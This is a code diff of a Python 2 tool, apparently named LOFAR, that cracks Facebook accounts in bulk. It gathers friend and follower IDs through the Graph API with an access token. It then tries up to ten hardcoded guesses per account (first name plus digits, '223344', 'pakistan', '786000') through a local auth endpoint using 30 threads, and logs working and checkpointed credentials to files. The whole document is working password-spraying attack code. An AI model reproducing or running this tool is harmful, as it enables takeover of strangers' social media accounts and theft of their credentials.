@@ -268,12 +268,11 @@ def menu():
     print 47 * '-'
     print ' \x1b[1;93m Active token: \x1b[1;91m' + tok
     print ' ------------------------------------------ '
-    print '\x1b[1;96m[1] Crack with Name password'
-    print '\x1b[1;96m[2] Crack with Number password'
-    print '\x1b[1;96m[3] Make File'
-    print '\x1b[1;96m[4] View token'
-    print '\x1b[1;96m[5] Logout'
-    print '\x1b[1;96m[6] Delete trash files'
+    print '\x1b[1;96m[1] Crack with Auto Password 10'
+    print '\x1b[1;96m[2] Make File'
+    print '\x1b[1;96m[3] View token'
+    print '\x1b[1;96m[4] Logout'
+    print '\x1b[1;96m[5] Delete trash files'
     menu_s()
 
 
@@ -282,14 +281,12 @@ def menu_s():
     if ms == '1':
         auto_crack()
     elif ms == '2':
-        choice_crack()
-    elif ms == '3':
         os.system('python2 LofarFileMake.sos')
-    elif ms == '4':
+    elif ms == '3':
         v_tok()
-    elif ms == '5':
+    elif ms == '4':
         lout()
-    elif ms == '6':
+    elif ms == '5':
         rtrash()
     else:
         print ''
@@ -335,12 +332,35 @@ def auto_crack():
 
     os.system('clear')
     print logo
-    print '\x1b[1;93m~~~~ Name pass cracking ~~~~\x1b[1;91m'
+    print '\x1b[0;33m--- AUTO PASS CRACKING ---\x1b[0;33m'
     print 47 * '-'
-    print '\x1b[1;96m[1] Public id cloning'
-    print '\x1b[1;96m[2] Followers cloning'
-    print '\x1b[1;96m[3] File cloning'
-    print '\x1b[1;96m[B] Back'
+    print '\x1b[0;33m[1] PUBLIC ID CLONING'
+    print '\x1b[0;33m[2] FOLLOWERS ID CLONING'
+    print '\x1b[0;33m[3] FILE CLONING'
+    print '\x1b[0;33m[0] BACK'
+    a_s()
+
+
+def auto_crack():
+    global token
+    try:
+        token = open('access_token.txt', 'r').read()
+    except (KeyError, IOError):
+        os.system('clear')
+        print logo
+        print '\t Login FB id to continue\x1b[0;97m'
+        print ''
+        time.sleep(1)
+        log_menu()
+
+    os.system('clear')
+    print logo
+    print '\x1b[0;33m--- AUTO PASS CRACKING ---\x1b[0;33m'
+    print 47 * '-'
+    print '\x1b[0;33m[1] PUBLIC ID CLONING'
+    print '\x1b[0;33m[2] FOLLOWERS ID CLONING'
+    print '\x1b[0;33m[3] FILE CLONING'
+    print '\x1b[0;33m[0] BACK'
     a_s()
 
 
@@ -352,26 +372,20 @@ def a_s():
     if a_s == '1':
         os.system('clear')
         print logo
-        print '\x1b[1;93m~~~~ Name pass public cracking ~~~~\x1b[1;91m'
+        print '\x1b[0;33m--- AUTO PASS PUBLIC CRACKING ---\x1b[0;33m'
         print 47 * '-'
-        print '\x1b[1;93mFor example:123,1234,12345,786,12,1122\x1b[1;91m'
-        print 47 * '-'
-        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
-        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
-        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
-        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
-        idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter id: ')
+        idt = raw_input(' \x1b[1;93m[\xe2\x98\x85] ENTER ID: ')
         try:
             r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
             q = json.loads(r.text)
             z = q['name']
             os.system('clear')
             print logo
-            print '\x1b[1;93m~~~~Name pass public cracking~~~~'
+            print '\x1b[0;33m--- AUTO PASS PUBLIC CRACKING ---'
             print ' \x1b[1;92mCloning from: ' + z
         except (KeyError, IOError):
-            print '\t Invalid user \x1b[0;97m'
-            raw_input(' \x1b[1;92mPress enter to try again ')
+            print '\t INVALID USER \x1b[0;97m'
+            raw_input(' \x1b[1;92mPRESS ENTER TO TRY AGAIN ')
             auto_crack()
 
         r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
@@ -382,50 +396,11 @@ def a_s():
             nm = na.rsplit(' ')[0]
             id.append(uid + '|' + nm)
 
-    elif a_s == '2':
-        os.system('clear')
-        print logo
-        print '\x1b[1;93m~~~~ Name pass followers cracking ~~~~\x1b[1;91m'
-        print 47 * '-'
-        print ' \x1b[1;93mFor example:123,1234,12345,786,12,1122\x1b[1;91m'
-        print 47 * '-'
-        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
-        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
-        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
-        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
-        idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter id: ')
-        try:
-            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
-            q = json.loads(r.text)
-            z = q['name']
-            os.system('clear')
-            print logo
-            print '\x1b[1;93m~~~~ Name pass followers cracking ~~~~'
-            print ' \x1b[1;92mCloning from: ' + z
-        except (KeyError, IOError):
-            print '\t Invalid user \x1b[0;97m'
-            raw_input('\x1b[1;92mPress enter to try again ')
-            auto_crack()
-
-        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
-        z = json.loads(r.text)
-        for i in z['data']:
-            uid = i['id']
-            na = i['name']
-            nm = na.rsplit(' ')[0]
-            id.append(uid + '|' + nm)
-
     elif a_s == '3':
         os.system('clear')
         print logo
-        print '\x1b[1;93m~~~~ Name pass File cracking ~~~~\x1b[1;91m'
+        print '\x1b[0;33m--- AUTO PASS FILE CRACKING ---\x1b[0;33m'
         print 47 * '-'
-        print '\x1b[1;93mFor example:123,1234,12345,786,12,1122\x1b[1;91m'
-        print 47 * '-'
-        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
-        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
-        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
-        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
         try:
             idlist = raw_input('[+] File Name: ')
             for line in open(idlist, 'r').readlines():
@@ -454,295 +429,166 @@ def a_s():
         user = arg
         uid, name = user.split('|')
         try:
-            pass1 = name.lower() + p1
+            pass1 = name.lower() + '12345'
             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
             q = json.loads(data)
             if 'loc' in q:
-                print '\x1b[1;92m[LOFAR/OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
-                ok = open('/sdcard/ids/LOFAROK.txt', 'a')
+                print '\x1b[0;32m[OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                ok = open('/sdcard/ids/LOFAR_OK.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in q['error']:
-                print '\x1b[1;96;1m[LOFAR/CP] ' + uid + ' | ' + pass1
-                cp = open('LOFARCP.txt', 'a')
+                print '\x1b[0;31m[CP] ' + uid + ' | ' + pass1
+                cp = open('LOFAR_CP.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
                 cps.append(uid + pass1)
             else:
-                pass2 = name.lower() + p2
+                pass2 = name.lower() + '1234'
                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                 q = json.loads(data)
                 if 'loc' in q:
-                    print '\x1b[1;92m[LOFAR/OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
-                    ok = open('/sdcard/ids/LOFAROK.txt', 'a')
+                    print '\x1b[0;32m[OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    ok = open('/sdcard/ids/LOFAR_OK.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in q['error']:
-                    print '\x1b[1;96;1m[LOFAR/CP] ' + uid + ' | ' + pass2
-                    cp = open('LOFARCP.txt', 'a')
+                    print '\x1b[0;31m[CP]' + uid + ' | ' + pass2
+                    cp = open('LOFAR_CP.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
                     cps.append(uid + pass2)
                 else:
-                    pass3 = name.lower() + p3
+                    pass3 = name.lower() + '786'
                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                     q = json.loads(data)
                     if 'loc' in q:
-                        print '\x1b[1;92m[LOFAR/OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
-                        ok = open('/sdcard/ids/LOFAROK.txt', 'a')
+                        print '\x1b[0;32m[OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
+                        ok = open('/sdcard/ids/LOFAR_OK.txt', 'a')
                         ok.write(uid + ' | ' + pass3 + '\n')
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'www.facebook.com' in q['error']:
-                        print '\x1b[1;96;1m[LOFAR/CP] ' + uid + ' | ' + pass3
-                        cp = open('LOFARCP.txt', 'a')
+                        print '\x1b[0;31m[CP] ' + uid + ' | ' + pass3
+                        cp = open('LOFAR_CP.txt', 'a')
                         cp.write(uid + ' | ' + pass3 + '\n')
                         cp.close()
                         cps.append(uid + pass3)
                     else:
-                        pass4 = name.lower() + p4
+                        pass4 = name.lower() + '123'
                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                         q = json.loads(data)
                         if 'loc' in q:
-                            print '\x1b[1;92m[LOFAR/OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
-                            ok = open('/sdcard/ids/LOFAROK.txt', 'a')
+                            print '\x1b[0;32m[OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
+                            ok = open('/sdcard/ids/LOFAR_OK.txt', 'a')
                             ok.write(uid + ' | ' + pass4 + '\n')
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'www.facebook.com' in q['error']:
-                            print '\x1b[1;96;1m[LOFAR/CP] ' + uid + ' | ' + pass4
-                            cp = open('LOFARCP.txt', 'a')
+                            print '\x1b[0;31m[CP] ' + uid + ' | ' + pass4
+                            cp = open('LOFAR_CP.txt', 'a')
                             cp.write(uid + ' | ' + pass4 + '\n')
                             cp.close()
                             cps.apppend(uid + pass4)
-        except:
-            pass
-
-    p = ThreadPool(30)
-    p.map(main, id)
-    print 47 * '-'
-    print ' \x1b[1;96mCrack Done'
-    print ' \x1b[1;96mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
-    print 47 * '-'
-    raw_input(' \x1b[1;93mPress enter to back')
-    auto_crack()
-
-
-def crack_b():
-    global toket
-    try:
-        toket = open('login.txt', 'r').read()
-    except (KeyError, IOError):
-        os.system('clear')
-        print logo
-        print '\t File Not Found \x1b[0;97m'
-        time.sleep(1)
-        log_menu()
-
-    os.system('clear')
-    print logo
-    print '\x1b[1;93m~~~~ Number pass cracking ~~~~\x1b[1;91m'
-    print 47 * '-'
-    print '\x1b[1;96m[1] Public id cloning'
-    print '\x1b[1;96m[2] Followers cloning'
-    print '\x1b[1;96m[3] File cloning'
-    print '\x1b[1;96m[0] Back'
-    c_s()
-
-
-def choice_crack():
-    global token
-    try:
-        token = open('access_token.txt', 'r').read()
-    except (KeyError, IOError):
-        os.system('clear')
-        print logo
-        print '\x1b[1;93m~~~ Login FB id to continue ~~~'
-        time.sleep(1)
-        log_menu()
-
-    os.system('clear')
-    print logo
-    print '\x1b[1;93m~~~~ Number pass cracking ~~~~\x1b[1;91m'
-    print 47 * '-'
-    print '\x1b[1;96m[1] Public id cloning'
-    print '\x1b[1;96m[2] Followers cloning'
-    print '\x1b[1;96m[3] File cloning'
-    print '\x1b[1;96m[B] Back'
-    c_s()
-
-
-def c_s():
-    id = []
-    cps = []
-    oks = []
-    a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80LOFAR\xe2\x9e\xa4 ')
-    if a_s == '1':
-        os.system('clear')
-        print logo
-        print '\x1b[1;93m ~~~~ Number pass Public cracking ~~~~\x1b[1;91m'
-        print 47 * '-'
-        print '\x1b[1;93m For example:234567,223344,334455,445566\x1b[1;91m'
-        print 47 * '-'
-        pass1 = raw_input(' \x1b[1;92m[1]Password: ')
-        pass2 = raw_input(' \x1b[1;92m[2]Password: ')
-        pass3 = raw_input(' \x1b[1;92m[3]Password: ')
-        pass4 = raw_input(' \x1b[1;92m[4]Password: ')
-        idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter id: ')
-        try:
-            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
-            q = json.loads(r.text)
-            z = q['name']
-            os.system('clear')
-            print logo
-            print '\x1b[1;93m ~~~~ Number pass Public cracking ~~~~'
-            print ' Cloning from: ' + z
-        except (KeyError, IOError):
-            print '\t Invalid user \x1b[0;97m'
-            raw_input(' Press enter to try again ')
-            choice_crack()
-
-        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
-        z = json.loads(r.text)
-        for i in z['data']:
-            uid = i['id']
-            na = i['name']
-            nm = na.rsplit(' ')[0]
-            id.append(uid + '|' + nm)
-
-    elif a_s == '2':
-        os.system('clear')
-        print logo
-        print '\x1b[1;93m~~~~ Number pass followers cracking ~~~~\x1b[1;91m'
-        print 47 * '-'
-        print '\x1b[1;93m For example:234567,223344,334455,445566\x1b[1;91m'
-        print 47 * '-'
-        pass1 = raw_input(' \x1b[1;92m[1]Password: ')
-        pass2 = raw_input(' \x1b[1;92m[2]Password: ')
-        pass3 = raw_input(' \x1b[1;92m[3]Password: ')
-        pass4 = raw_input(' \x1b[1;92m[4]Password: ')
-        idt = raw_input(' \x1b[1;93mEnter id: ')
-        try:
-            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
-            q = json.loads(r.text)
-            z = q['name']
-            os.system('clear')
-            print logo
-            print '\x1b[1;93m~~~~ Number pass followers cracking ~~~~'
-            print ' Cloning from: ' + z
-        except (KeyError, IOError):
-            print '\t Invalid user \x1b[0;97m'
-            raw_input('Press enter to try again ')
-            auto_crack()
-
-        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
-        z = json.loads(r.text)
-        for i in z['data']:
-            uid = i['id']
-            na = i['name']
-            nm = na.rsplit(' ')[0]
-            id.append(uid + '|' + nm)
-
-    elif a_s == '3':
-        os.system('clear')
-        print logo
-        print '\x1b[1;93m ~~~~ Number pass File cracking ~~~~\x1b[1;91m'
-        print 47 * '-'
-        print '\x1b[1;93m For example:234567,223344,334455,445566\x1b[1;91m'
-        print 47 * '-'
-        pass1 = raw_input(' \x1b[1;92m[1]Password: ')
-        pass2 = raw_input(' \x1b[1;92m[2]Password: ')
-        pass3 = raw_input(' \x1b[1;92m[3]Password: ')
-        pass4 = raw_input(' \x1b[1;92m[4]Password: ')
-        try:
-            idlist = raw_input('[+] File Name: ')
-            for line in open(idlist, 'r').readlines():
-                id.append(line.strip())
-
-        except IOError:
-            print '[!] File Not Found.'
-            raw_input('Press Enter To Back. ')
-            crack_b()
-
-    elif a_s == '0':
-        menu()
-    else:
-        print ''
-        print '\t Choose valid option' + w
-        c_s()
-    print ' Total ids: ' + str(len(id))
-    time.sleep(0.5)
-    print ' \x1b[1;97m~~~ Crack Running ~~~\x1b[1;91m'
-    time.sleep(0.5)
-    print 47 * '-'
-    print '\t\x1b[1;93mAbhi To Party Shuru Howe Ha.\x1b[1;91m'
-    print 47 * '-'
-
-    def main(arg):
-        user = arg
-        uid, name = user.split('|')
-        try:
-            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
-            q = json.loads(data)
-            if 'loc' in q:
-                print '\x1b[1;92m[LOFAR/OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
-                ok = open('/sdcard/ids/LOFAROK.txt', 'a')
-                ok.write(uid + ' | ' + pass1 + '\n')
-                ok.close()
-                oks.append(uid + pass1)
-            elif 'www.facebook.com' in q['error']:
-                print '\x1b[1;96;1m[LOFAR/CP] ' + uid + ' | ' + pass1
-                cp = open('LOFARCP.txt', 'a')
-                cp.write(uid + ' | ' + pass1 + '\n')
-                cp.close()
-                cps.append(uid + pass1)
-            else:
-                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
-                q = json.loads(data)
-                if 'loc' in q:
-                    print '\x1b[1;92m[LOFAR/OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
-                    ok = open('/sdcard/ids/LOFAROK.txt', 'a')
-                    ok.write(uid + ' | ' + pass2 + '\n')
-                    ok.close()
-                    oks.append(uid + pass2)
-                elif 'www.facebook.com' in q['error']:
-                    print '\x1b[1;96;1m[LOFAR/CP] ' + uid + ' | ' + pass2
-                    cp = open('LOFARCP.txt', 'a')
-                    cp.write(uid + ' | ' + pass2 + '\n')
-                    cp.close()
-                    cps.append(uid + pass2)
-                else:
-                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
-                    q = json.loads(data)
-                    if 'loc' in q:
-                        print '\x1b[1;92m[LOFAR/OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
-                        ok = open('/sdcard/ids/LOFAROK.txt', 'a')
-                        ok.write(uid + ' | ' + pass3 + '\n')
-                        ok.close()
-                        oks.append(uid + pass3)
-                    elif 'www.facebook.com' in q['error']:
-                        print '\x1b[1;96;1m[LOFAR/CP] ' + uid + ' | ' + pass3
-                        cp = open('LOFARCP.txt', 'a')
-                        cp.write(uid + ' | ' + pass3 + '\n')
-                        cp.close()
-                        cps.append(uid + pass3)
-                    else:
-                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
-                        q = json.loads(data)
-                        if 'loc' in q:
-                            print '\x1b[1;92m[LOFAR/OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
-                            ok = open('/sdcard/ids/LOFAROK.txt', 'a')
-                            ok.write(uid + ' | ' + pass4 + '\n')
-                            ok.close()
-                            oks.append(uid + pass4)
-                        elif 'www.facebook.com' in q['error']:
-                            print '\x1b[1;96;1m[LOFAR/CP] ' + uid + ' | ' + pass4
-                            cp = open('LOFARCP.txt', 'a')
-                            cp.write(uid + ' | ' + pass4 + '\n')
-                            cp.close()
-                            cps.apppend(uid + pass4)
+                        else:
+                            pass5 = '223344'
+                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
+                            q = json.loads(data)
+                            if 'loc' in q:
+                                print '\x1b[0;32m[OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
+                                ok = open('/sdcard/ids/LOFAR_OK.txt', 'a')
+                                ok.write(uid + ' | ' + pass5 + '\n')
+                                ok.close()
+                                oks.append(uid + pass5)
+                            elif 'www.facebook.com' in q['error']:
+                                print '\x1b[0;31m[CP] ' + uid + ' | ' + pass5
+                                cp = open('LOFAR_CP.txt', 'a')
+                                cp.write(uid + ' | ' + pass5 + '\n')
+                                cp.close()
+                                cps.apppend(uid + pass5)
+                            else:
+                                pass6 = '334455'
+                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
+                                q = json.loads(data)
+                                if 'loc' in q:
+                                    print '\x1b[0;32m[OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
+                                    ok = open('/sdcard/ids/LOFAR_OK.txt', 'a')
+                                    ok.write(uid + ' | ' + pass6 + '\n')
+                                    ok.close()
+                                    oks.append(uid + pass6)
+                                elif 'www.facebook.com' in q['error']:
+                                    print '\x1b[0;31m[CP] ' + uid + ' | ' + pass6
+                                    cp = open('LOFAR_CP.txt', 'a')
+                                    cp.write(uid + ' | ' + pass6 + '\n')
+                                    cp.close()
+                                    cps.apppend(uid + pass6)
+                                else:
+                                    pass7 = '445566'
+                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
+                                    q = json.loads(data)
+                                    if 'loc' in q:
+                                        print '\x1b[0;32m[OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
+                                        ok = open('/sdcard/ids/LOFAR_OK.txt', 'a')
+                                        ok.write(uid + ' | ' + pass7 + '\n')
+                                        ok.close()
+                                        oks.append(uid + pass7)
+                                    elif 'www.facebook.com' in q['error']:
+                                        print '\x1b[0;31m[CP] ' + uid + ' | ' + pass7
+                                        cp = open('LOFAR_CP.txt', 'a')
+                                        cp.write(uid + ' | ' + pass7 + '\n')
+                                        cp.close()
+                                        cps.apppend(uid + pass7)
+                                    else:
+                                        pass8 = 'pakistan'
+                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
+                                        q = json.loads(data)
+                                        if 'loc' in q:
+                                            print '\x1b[0;32m[OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
+                                            ok = open('/sdcard/ids/LOFAR_OK.txt', 'a')
+                                            ok.write(uid + ' | ' + pass8 + '\n')
+                                            ok.close()
+                                            oks.append(uid + pass8)
+                                        elif 'www.facebook.com' in q['error']:
+                                            print '\x1b[0;31m[CP] ' + uid + ' | ' + pass8
+                                            cp = open('LOFAR_CP.txt', 'a')
+                                            cp.write(uid + ' | ' + pass8 + '\n')
+                                            cp.close()
+                                            cps.apppend(uid + pass8)
+                                        else:
+                                            pass9 = '1234567'
+                                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass9, headers=header).text
+                                            q = json.loads(data)
+                                            if 'loc' in q:
+                                                print '\x1b[0;32m[OK] \x1b[1;32m' + uid + ' | ' + pass9 + '\x1b[0;97m'
+                                                ok = open('/sdcard/ids/LOFAR_OK.txt', 'a')
+                                                ok.write(uid + ' | ' + pass9 + '\n')
+                                                ok.close()
+                                                oks.append(uid + pass9)
+                                            elif 'www.facebook.com' in q['error']:
+                                                print '\x1b[0;31m[CP] ' + uid + ' | ' + pass9
+                                                cp = open('LOFAR_CP.txt', 'a')
+                                                cp.write(uid + ' | ' + pass9 + '\n')
+                                                cp.close()
+                                                cps.apppend(uid + pass9)
+                                            else:
+                                                pass10 = '786000'
+                                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass10, headers=header).text
+                                                q = json.loads(data)
+                                                if 'loc' in q:
+                                                    print '\x1b[0;32m[OK] \x1b[1;32m' + uid + ' | ' + pass10 + '\x1b[0;97m'
+                                                    ok = open('/sdcard/ids/LOFAR_OK.txt', 'a')
+                                                    ok.write(uid + ' | ' + pass10 + '\n')
+                                                    ok.close()
+                                                    oks.append(uid + pass10)
+                                                elif 'www.facebook.com' in q['error']:
+                                                    print '\x1b[0;31m[CP] ' + uid + ' | ' + pass10
+                                                    cp = open('LOFAR_CP.txt', 'a')
+                                                    cp.write(uid + ' | ' + pass10 + '\n')
+                                                    cp.close()
+                                                    cps.apppend(uid + pass10)
+        
         except:
             pass
 
